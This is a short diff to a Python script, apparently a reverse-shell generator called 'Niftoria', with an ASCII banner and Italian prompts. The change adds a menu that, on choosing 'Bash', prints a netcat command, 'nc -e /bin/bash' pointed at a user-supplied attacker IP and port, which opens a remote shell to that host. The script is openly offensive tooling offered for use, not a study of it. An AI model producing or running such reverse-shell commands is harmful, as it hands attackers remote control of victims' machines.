@@ -1,4 +1,7 @@
+# -*- coding: utf-8 -*-
 import argparse
+
+'''
 title = """\
  ███▄    █  ██▓  █████▒▄▄▄█████▓ ▒█████   ██▀███   ██▓ ▄▄▄      
  ██ ▀█   █ ▓██▒▓██   ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▒████▄    
@@ -11,6 +14,8 @@ title = """\
          ░  ░                       ░ ░     ░      ░        ░  ░
                                                                 
 """
+'''
+title = "Niftoria"
 # Initialize parser
 parser = argparse.ArgumentParser()
 parser.add_argument("-H", "--host", help = "Attacking IP")
@@ -23,5 +28,10 @@ if __name__ == "__main__":
     print(title)
     args = parser.parse_args()
  
-    if args.host and args.port:
-        print(f"IP della macchina attaccante: {args.host}:{args.port}")
+    print("Choose the reverse shell:")
+    print("1 - Bash")
+    input = input("Scelta: >")
+    if(input == "1"):
+        print(f"nc -e /bin/bash {args.host} {args.port}")
+    else: quit
+
